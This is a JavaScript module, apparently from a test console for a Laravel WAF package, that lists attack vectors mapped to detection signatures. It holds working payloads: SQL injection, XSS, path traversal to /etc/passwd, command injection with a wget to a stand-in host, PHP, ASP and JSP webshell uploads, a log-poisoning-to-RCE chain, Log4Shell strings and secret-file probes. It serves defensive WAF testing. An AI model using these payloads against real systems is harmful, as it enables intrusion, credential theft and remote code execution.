/**
 * Katalog serangan lengkap untuk package `robyajo/pasak` (Bulwark).
 *
 * Setiap grup di bawah memetakan 1:1 ke signature di `config/pasak.php`:
 *  - instant_block.signatures: webshell_upload, unsafe_filename, webshell_path,
 *    path_traversal_public, config_probe, ssti, php_injection, scanner_ua,
 *    secret_exposure, log4shell_jndi
 *  - rules: sql_injection, xss, path_traversal, command_injection,
 *    code_injection, template_injection, null_byte
 *  - sensitive_paths (critical + high) dan scanner_agents
 *
 * Format vektor:
 *   - `label`     : nama tombol
 *   - `path`      : path/query yang dikirim
 *   - `method`    : metode HTTP rekomendasi
 *   - `userAgent` : User-Agent khusus (opsional)
 *   - `payload`   : body request (opsional, untuk POST/PUT/PATCH)
 *   - `upload`    : spesifikasi berkas multipart (opsional)
 *   - `advice`    : { reason, expect, steps? }
 *
 * Middleware WAF berjalan sebelum routing, jadi path contoh (`/upload`, dll.)
 * tetap dipindai walau route-nya tidak ada (respons 404 pun memicu deteksi).
 * Kecuali dinyatakan lain, semua vektor di bawah diekspektasikan `403`
 * (instant-block) atau tercatat sebagai threat log (progressive rules).
 */
export const attackVectorGroups = [
    {
        group: "SSTI (ssti)",
        items: [
            {
                label: "SSTI {{7*7}}",
                path: "/?q=%7B%7B7*7%7D%7D",
                method: "GET",
                advice: {
                    reason: "Canary klasik {{7*7}} — bila lolos cari 49 di body.",
                    expect: "403 instant-block (signature ssti).",
                },
            },
            {
                label: "SSTI {{7-7}}",
                path: "/?q=%7B%7B7-7%7D%7D",
                method: "GET",
                advice: {
                    reason: "Varian pengurangan angka.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "SSTI ${7*7}",
                path: "/?q=%24%7B7*7%7D",
                method: "GET",
                advice: {
                    reason: "Sintaks dollar-brace (Spring/Freemarker).",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "SSTI <%= 7*7 %>",
                path: "/?q=%3C%25%3D%207*7%20%25%3E",
                method: "GET",
                advice: {
                    reason: "Sintaks ERB/EJS.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "SSTI {{self}}",
                path: "/?q=%7B%7Bself%7D%7D",
                method: "GET",
                advice: {
                    reason: "Akses objek template internal (self/config/app).",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "SSTI body POST",
                path: "/contact",
                method: "POST",
                payload: "name={{7*7}}&message=hello",
                advice: {
                    reason: "SSTI via body form — target input.",
                    expect: "403 bila block_suspicious_requests aktif.",
                },
            },
        ],
    },
    {
        group: "SQL Injection (sql_injection)",
        items: [
            {
                label: "SQLi UNION SELECT",
                path: "/?id=1%20UNION%20SELECT%20password%20FROM%20users",
                method: "GET",
                advice: {
                    reason: "Pola UNION SELECT klasik.",
                    expect: "Log critical; 403 bila block_suspicious_requests aktif, auto-block setelah threshold.",
                },
            },
            {
                label: "SQLi OR 1=1",
                path: "/?user=admin%27%20OR%20%271%27%3D%271",
                method: "GET",
                advice: {
                    reason: "Auth bypass OR 1=1.",
                    expect: "Log critical.",
                },
            },
            {
                label: "SQLi SLEEP benchmark",
                path: "/?id=1%20AND%20SLEEP(5)",
                method: "GET",
                advice: {
                    reason: "Time-based blind (sleep/benchmark/pg_sleep).",
                    expect: "Log critical.",
                },
            },
            {
                label: "SQLi xp_cmdshell",
                path: "/?id=1%3B%20EXEC%20xp_cmdshell%20%27dir%27",
                method: "GET",
                advice: {
                    reason: "MSSQL stacked + xp_cmdshell.",
                    expect: "Log critical.",
                },
            },
            {
                label: "SQLi information_schema",
                path: "/?id=-1%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables",
                method: "GET",
                advice: {
                    reason: "Enum skema database.",
                    expect: "Log critical.",
                },
            },
            {
                label: "SQLi INTO OUTFILE",
                path: "/?id=1%20INTO%20OUTFILE%20%27%2Ftmp%2Fpwn%27",
                method: "GET",
                advice: {
                    reason: "File write via SQL.",
                    expect: "Log critical.",
                },
            },
            {
                label: "SQLi comment --",
                path: "/?id=1%27--",
                method: "GET",
                advice: {
                    reason: "Komentar SQL untuk memotong query.",
                    expect: "Log critical.",
                },
            },
        ],
    },
    {
        group: "XSS (xss)",
        items: [
            {
                label: "XSS <script>",
                path: "/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
                method: "GET",
                advice: {
                    reason: "Reflected XSS dasar.",
                    expect: "Log high; 403 bila block aktif.",
                },
            },
            {
                label: "XSS <img onerror>",
                path: "/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
                method: "GET",
                advice: {
                    reason: "Event handler onerror.",
                    expect: "Log high.",
                },
            },
            {
                label: "XSS <svg onload>",
                path: "/?q=%3Csvg%20onload%3Dalert(1)%3E",
                method: "GET",
                advice: {
                    reason: "Vektor SVG onload.",
                    expect: "Log high.",
                },
            },
            {
                label: "XSS javascript:",
                path: "/?redir=javascript%3Aalert(1)",
                method: "GET",
                advice: {
                    reason: "Skema javascript: pada redirect.",
                    expect: "Log high.",
                },
            },
            {
                label: "XSS document.cookie",
                path: "/?q=%3Cscript%3Edocument.cookie%3C%2Fscript%3E",
                method: "GET",
                advice: {
                    reason: "Pencurian cookie.",
                    expect: "Log high.",
                },
            },
            {
                label: "XSS encoded %3cscript",
                path: "/?q=%253cscript%253ealert(1)",
                method: "GET",
                advice: {
                    reason: "Bypass filter via encoding.",
                    expect: "Log high.",
                },
            },
        ],
    },
    {
        group: "Path Traversal / LFI (path_traversal)",
        items: [
            {
                label: "/etc/passwd",
                path: "/../../../../etc/passwd",
                method: "GET",
                advice: {
                    reason: "Traversal mentah (proxy tidak menormalisasi ../).",
                    expect: "403 instant-block (path_traversal_public).",
                },
            },
            {
                label: "Nested traversal",
                path: "/?file=....//....//....//....//etc/passwd",
                method: "GET",
                advice: {
                    reason: "Bypass filter naif ....//.",
                    expect: "403 atau log critical.",
                },
            },
            {
                label: "Encoded traversal %2e%2e",
                path: "/?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                method: "GET",
                advice: {
                    reason: "Traversal ter-encode.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "php://filter",
                path: "/?file=php://filter/convert.base64-encode/resource=index.php",
                method: "GET",
                advice: {
                    reason: "Wrapper PHP baca source (code_injection).",
                    expect: "403 / log critical.",
                },
            },
            {
                label: "/proc/self/environ",
                path: "/?file=../../../../proc/self/environ",
                method: "GET",
                advice: {
                    reason: "Baca environment proses.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "Windows win.ini",
                path: "/../../../../windows/win.ini",
                method: "GET",
                advice: {
                    reason: "Traversal lintas-platform.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "Null byte LFI",
                path: "/?file=../../../../etc/passwd%00",
                method: "GET",
                advice: {
                    reason: "Bypass ekstensi via null byte (null_byte).",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "Laravel log file",
                path: "/?file=../../../../storage/logs/laravel.log",
                method: "GET",
                advice: {
                    reason: "Target log Laravel — bahan log poisoning.",
                    expect: "403 bila diblokir; siapkan untuk vektor RCE.",
                },
            },
            {
                label: "Traversal ke public/",
                path: "/../../public/.env",
                method: "GET",
                advice: {
                    reason: "Traversal menuju folder publik.",
                    expect: "403 instant-block.",
                },
            },
        ],
    },
    {
        group: "Command Injection (command_injection)",
        items: [
            {
                label: "CMDi ; id",
                path: "/?cmd=test%3B%20id",
                method: "GET",
                advice: {
                    reason: "Pemisah semicolon + perintah id.",
                    expect: "Log critical.",
                },
            },
            {
                label: "CMDi | cat",
                path: "/?file=index%7C%20cat%20%2Fetc%2Fpasswd",
                method: "GET",
                advice: {
                    reason: "Pipe ke cat.",
                    expect: "Log critical.",
                },
            },
            {
                label: "CMDi $(whoami)",
                path: "/?q=%24(whoami)",
                method: "GET",
                advice: {
                    reason: "Subshell $().",
                    expect: "Log critical.",
                },
            },
            {
                label: "CMDi && wget",
                path: "/?q=a%26%26%20wget%20http%3A%2F%2Fevil.test%2Fx",
                method: "GET",
                advice: {
                    reason: "Download payload remote.",
                    expect: "Log critical.",
                },
            },
            {
                label: "CMDi body POST",
                path: "/search",
                method: "POST",
                payload: "q=test; cat /etc/passwd",
                advice: {
                    reason: "CMDi via body form.",
                    expect: "Log critical.",
                },
            },
        ],
    },
    {
        group: "Code / File Inclusion (code_injection)",
        items: [
            {
                label: "eval(base64_decode)",
                path: "/?x=eval(base64_decode(%27cGhwaW5mbygpOw%3D%3D%27))",
                method: "GET",
                advice: {
                    reason: "Eksekusi kode ter-encode.",
                    expect: "Log critical.",
                },
            },
            {
                label: "data:// wrapper",
                path: "/?file=data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgcGhwaW5mbygpOz8%2B",
                method: "GET",
                advice: {
                    reason: "Wrapper data:// untuk include kode.",
                    expect: "Log critical.",
                },
            },
            {
                label: "expect:// wrapper",
                path: "/?file=expect%3A%2F%2Fid",
                method: "GET",
                advice: {
                    reason: "Wrapper expect:// eksekusi perintah.",
                    expect: "Log critical.",
                },
            },
            {
                label: "phar:// deserial",
                path: "/?file=phar%3A%2F%2Fuploads%2Fshell.phar%2Ftest",
                method: "GET",
                advice: {
                    reason: "PHAR deserialization.",
                    expect: "Log critical.",
                },
            },
        ],
    },
    {
        group: "PHP Injection (php_injection)",
        items: [
            {
                label: "PHP <?php tag",
                path: "/?name=%3C%3Fphp%20system(%24_GET%5B%27c%27%5D)%3B%20%3F%3E",
                method: "GET",
                advice: {
                    reason: "Tag PHP via parameter — target input.",
                    expect: "403 instant-block (php_injection).",
                },
            },
            {
                label: "PHP system($_GET)",
                path: "/",
                method: "POST",
                payload: "comment=<?php system($_GET[\"c\"]); ?>",
                advice: {
                    reason: "Kode PHP via body form.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "PHP base64_decode",
                path: "/",
                method: "POST",
                payload: "q=eval(base64_decode(\"cGhwaW5mbygpOw==\"))",
                advice: {
                    reason: "Fungsi berbahaya + decoding.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "PHP include traversal",
                path: "/?page=include%20%22..%2F..%2Fconfig%2Fdatabase.php%22",
                method: "GET",
                advice: {
                    reason: "Include file sensitif via traversal.",
                    expect: "403 instant-block.",
                },
            },
        ],
    },
    {
        group: "Log Poisoning → RCE (log4shell_jndi)",
        items: [
            {
                label: "① Poison via UA",
                path: "/",
                method: "GET",
                userAgent: '<?php system($_GET["c"]); ?>',
                advice: {
                    reason: "Payload PHP tertulis ke access log via User-Agent.",
                    expect: "403 bila WAF memindai UA; lanjut ke ②.",
                    steps: [
                        "Kirim dengan IP acak baru.",
                        "Lanjut ke vektor ② untuk include berkas log.",
                    ],
                },
            },
            {
                label: "① Log4Shell UA",
                path: "/",
                method: "GET",
                userAgent: "${jndi:ldap://127.0.0.1:1389/a}",
                advice: {
                    reason: "Deteksi JNDI/log4j pada User-Agent.",
                    expect: "403 instant-block (log4shell_jndi).",
                },
            },
            {
                label: "① Log4Shell obfuscated",
                path: "/",
                method: "GET",
                userAgent: "${${lower:j}ndi:ldap://127.0.0.1:1389/a}",
                advice: {
                    reason: "Obfuscation ${lower:j} — diuji eksplisit oleh signature.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "① Log4Shell encoded",
                path: "/?q=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A1389%2Fa%7D",
                method: "GET",
                advice: {
                    reason: "Bentuk URL-encode %24%7Bjndi%3A.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "② Apache log + cmd",
                path: "/?file=../../../../var/log/apache2/access.log&c=id",
                method: "GET",
                advice: {
                    reason: "Include access log Apache + eksekusi ?c=id.",
                    expect: "403; bila lolos cari uid= di body.",
                    steps: [
                        "Jalankan ① dulu.",
                        "Sesuaikan path log dengan target.",
                    ],
                },
            },
            {
                label: "② Nginx log + cmd",
                path: "/?file=../../../../var/log/nginx/access.log&c=id",
                method: "GET",
                advice: {
                    reason: "Include access log Nginx.",
                    expect: "403; bila lolos cari uid= di body.",
                },
            },
            {
                label: "② Laravel log + cmd",
                path: "/?file=../../../../storage/logs/laravel.log&c=id",
                method: "GET",
                advice: {
                    reason: "Include log Laravel.",
                    expect: "403; bila lolos cari uid= di body.",
                },
            },
        ],
    },
    {
        group: "Config / Secret Probe (config_probe)",
        items: [
            {
                label: ".env probe",
                path: "/.env",
                method: "GET",
                advice: {
                    reason: "File kredensial utama Laravel.",
                    expect: "403 instant-block (config_probe / sensitive_paths).",
                },
            },
            {
                label: ".git/config probe",
                path: "/.git/config",
                method: "GET",
                advice: {
                    reason: "Repo terekspos — bisa di-clone.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: ".htaccess probe",
                path: "/.htaccess",
                method: "GET",
                advice: {
                    reason: "Konfigurasi Apache.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "id_rsa probe",
                path: "/.ssh/id_rsa",
                method: "GET",
                advice: {
                    reason: "Private key SSH.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "composer.json probe",
                path: "/composer.json",
                method: "GET",
                advice: {
                    reason: "Enum dependensi.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "backup.sql probe",
                path: "/backup.sql",
                method: "GET",
                advice: {
                    reason: "Dump database tertinggal.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: ".aws/credentials",
                path: "/.aws/credentials",
                method: "GET",
                advice: {
                    reason: "Kredensial AWS.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "docker-compose.yml",
                path: "/docker-compose.yml",
                method: "GET",
                advice: {
                    reason: "Konfigurasi deploy + secret.",
                    expect: "403 instant-block.",
                },
            },
        ],
    },
    {
        group: "Secret Exposure (secret_exposure)",
        items: [
            {
                label: "APP_KEY=",
                path: "/?debug=APP_KEY%3Dbase64%3Aabc123",
                method: "GET",
                advice: {
                    reason: "Pola kredensial APP_KEY= di request.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "DB_PASSWORD=",
                path: "/?q=DB_PASSWORD%3Dsecret123",
                method: "GET",
                advice: {
                    reason: "Pola password database.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "AWS AKIA key",
                path: "/?q=AKIAIOSFODNN7EXAMPLE",
                method: "GET",
                advice: {
                    reason: "Format AWS access key.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "Private key block",
                path: "/",
                method: "POST",
                payload: "key=-----BEGIN RSA PRIVATE KEY-----",
                advice: {
                    reason: "Blok private key via body.",
                    expect: "403 instant-block.",
                },
            },
        ],
    },
    {
        group: "Webshell Path (webshell_path)",
        items: [
            {
                label: "/wso.php",
                path: "/wso.php",
                method: "GET",
                advice: {
                    reason: "Nama webshell terkenal (wso/c99/r57/b374k).",
                    expect: "403 instant-block (webshell_path).",
                },
            },
            {
                label: "/c99.php",
                path: "/c99.php",
                method: "GET",
                advice: {
                    reason: "Webshell c99.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "/b374k.php",
                path: "/uploads/b374k.php",
                method: "GET",
                advice: {
                    reason: "Webshell b374k di folder upload.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "/adminer.php",
                path: "/adminer.php",
                method: "GET",
                advice: {
                    reason: "Tool DB yang disalahgunakan.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "/alfa-shell.php",
                path: "/alfa.php",
                method: "GET",
                advice: {
                    reason: "Varian Alfa shell.",
                    expect: "403 instant-block.",
                },
            },
        ],
    },
    {
        group: "Sensitive Paths (high)",
        items: [
            {
                label: "wp-login.php",
                path: "/wp-login.php",
                method: "GET",
                advice: {
                    reason: "Probe WordPress pada app Laravel.",
                    expect: "Log threat (sensitive path high).",
                },
            },
            {
                label: "phpmyadmin",
                path: "/phpmyadmin",
                method: "GET",
                advice: {
                    reason: "Probe panel database.",
                    expect: "Log threat.",
                },
            },
            {
                label: "phpinfo",
                path: "/phpinfo.php",
                method: "GET",
                advice: {
                    reason: "Halaman info PHP.",
                    expect: "Log threat.",
                },
            },
            {
                label: "telescope",
                path: "/telescope",
                method: "GET",
                advice: {
                    reason: "Debug bar Laravel terekspos.",
                    expect: "Log threat.",
                },
            },
            {
                label: "_ignition execute",
                path: "/_ignition/execute-solution",
                method: "GET",
                advice: {
                    reason: "Endpoint RCE Ignition lawas (CVE-2021-3129).",
                    expect: "Log threat.",
                },
            },
            {
                label: "actuator env",
                path: "/actuator/env",
                method: "GET",
                advice: {
                    reason: "Spring Boot actuator.",
                    expect: "Log threat.",
                },
            },
            {
                label: "xmlrpc.php",
                path: "/xmlrpc.php",
                method: "GET",
                advice: {
                    reason: "Probe WordPress XML-RPC.",
                    expect: "Log threat.",
                },
            },
            {
                label: "server-status",
                path: "/server-status",
                method: "GET",
                advice: {
                    reason: "Status Apache terekspos.",
                    expect: "Log threat.",
                },
            },
        ],
    },
    {
        group: "Scanner UA (scanner_ua)",
        items: [
            {
                label: "sqlmap UA",
                path: "/",
                method: "GET",
                userAgent: "sqlmap/1.7.2#stable (http://sqlmap.org)",
                advice: {
                    reason: "Signature scanner_ua + scanner_agents.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "Nikto UA",
                path: "/",
                method: "GET",
                userAgent:
                    "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:map_codes)",
                advice: {
                    reason: "User-Agent Nikto.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "nuclei UA",
                path: "/",
                method: "GET",
                userAgent: "Nuclei - Open-source vulnerability scanner",
                advice: {
                    reason: "Scanner Nuclei.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "gobuster UA",
                path: "/",
                method: "GET",
                userAgent: "gobuster/3.6",
                advice: {
                    reason: "Directory enumerator.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "ffuf UA",
                path: "/",
                method: "GET",
                userAgent: "Fuzz Faster U Fool v2.1.0",
                advice: {
                    reason: "Fuzzer ffuf.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "masscan UA",
                path: "/",
                method: "GET",
                userAgent: "masscan/1.3",
                advice: {
                    reason: "Port scanner masscan.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "nessus UA",
                path: "/",
                method: "GET",
                userAgent: "Nessus",
                advice: {
                    reason: "Vulnerability scanner Nessus.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "acunetix UA",
                path: "/",
                method: "GET",
                userAgent: "Acunetix",
                advice: {
                    reason: "Scanner Acunetix.",
                    expect: "403 instant-block.",
                },
            },
        ],
    },
    {
        group: "File Upload / Webshell (webshell_upload)",
        items: [
            {
                label: "PHP webshell",
                path: "/upload",
                method: "POST",
                upload: {
                    filename: "shell.php",
                    content: '<?php system($_GET["cmd"]); ?>',
                    content_type: "application/x-php",
                },
                advice: {
                    reason: "Ekstensi .php langsung (unsafe_filename).",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "PHTML shell",
                path: "/upload",
                method: "POST",
                upload: {
                    filename: "shell.phtml",
                    content: '<?php system($_GET["cmd"]); ?>',
                    content_type: "application/x-php",
                },
                advice: {
                    reason: "Alternatif .phtml.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "PHAR shell",
                path: "/upload",
                method: "POST",
                upload: {
                    filename: "shell.phar",
                    content: '<?php system($_GET["cmd"]); ?>',
                    content_type: "application/x-php",
                },
                advice: {
                    reason: "Arsip .phar.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "Double extension",
                path: "/upload",
                method: "POST",
                upload: {
                    filename: "shell.php.jpg",
                    content: '<?php system($_GET["cmd"]); ?>',
                    content_type: "image/jpeg",
                },
                advice: {
                    reason: "Double extension .php.jpg (webshell_upload).",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "Null byte upload",
                path: "/upload",
                method: "POST",
                upload: {
                    filename: "shell.php%00.jpg",
                    content: '<?php system($_GET["cmd"]); ?>',
                    content_type: "image/jpeg",
                },
                advice: {
                    reason: "Null byte di nama berkas (%00).",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "GIF magic shell",
                path: "/upload",
                method: "POST",
                upload: {
                    filename: "shell.php",
                    content: 'GIF89a<?php system($_GET["cmd"]); ?>',
                    content_type: "image/gif",
                },
                advice: {
                    reason: "Bypass magic-bytes GIF89a.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: ".htaccess override",
                path: "/upload",
                method: "POST",
                upload: {
                    filename: ".htaccess",
                    content: "AddType application/x-httpd-php .jpg",
                    content_type: "text/plain",
                },
                advice: {
                    reason: "Override handler agar .jpg dieksekusi.",
                    expect: "403 instant-block.",
                    steps: [
                        "Unggah .htaccess ini dulu.",
                        "Lalu unggah .jpg berisi PHP.",
                    ],
                },
            },
            {
                label: "SVG XSS",
                path: "/upload",
                method: "POST",
                upload: {
                    filename: "x.svg",
                    content:
                        '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
                    content_type: "image/svg+xml",
                },
                advice: {
                    reason: "Stored XSS via SVG onload.",
                    expect: "403 bila diblokir; bila lolos buka berkas.",
                },
            },
            {
                label: "ASP shell",
                path: "/upload",
                method: "POST",
                upload: {
                    filename: "shell.aspx",
                    content: '<% eval(Request["cmd"]) %>',
                    content_type: "text/plain",
                },
                advice: {
                    reason: "Webshell ASP/ASPX.",
                    expect: "403 instant-block.",
                },
            },
            {
                label: "JSP shell",
                path: "/upload",
                method: "POST",
                upload: {
                    filename: "shell.jsp",
                    content: '<% Runtime.getRuntime().exec(request.getParameter("c")); %>',
                    content_type: "text/plain",
                },
                advice: {
                    reason: "Webshell JSP.",
                    expect: "403 instant-block.",
                },
            },
        ],
    },
];

/**
 * Daftar datar seluruh vektor (dipakai bila tidak butuh pengelompokan).
 */
export const attackVectors = attackVectorGroups.flatMap((entry) => entry.items);

/**
 * Menentukan metode HTTP paling tepat untuk sebuah vektor:
 * unggah berkas atau body wajib POST, sisanya GET.
 */
export function recommendedMethod(vector) {
    if (vector.method) {
        return vector.method;
    }

    if (vector.upload || vector.payload) {
        return "POST";
    }

    return "GET";
}

/**
 * Preset User-Agent untuk menguji deteksi pemindai kerentanan sekaligus
 * menyuntikkan payload tertulis ke berkas log (log poisoning).
 */
export const userAgentPresets = [
    {
        label: "Browser",
        value: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    },
    { label: "sqlmap", value: "sqlmap/1.7.2#stable (http://sqlmap.org)" },
    {
        label: "Nikto",
        value: "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:map_codes)",
    },
    { label: "nuclei", value: "Nuclei - Open-source vulnerability scanner" },
    { label: "gobuster", value: "gobuster/3.6" },
    { label: "ffuf", value: "Fuzz Faster U Fool v2.1.0" },
    { label: "curl", value: "curl/8.7.1" },
    { label: "Log poison PHP", value: '<?php system($_GET["c"]); ?>' },
    { label: "Log4Shell JNDI", value: "${jndi:ldap://127.0.0.1:1389/a}" },
];
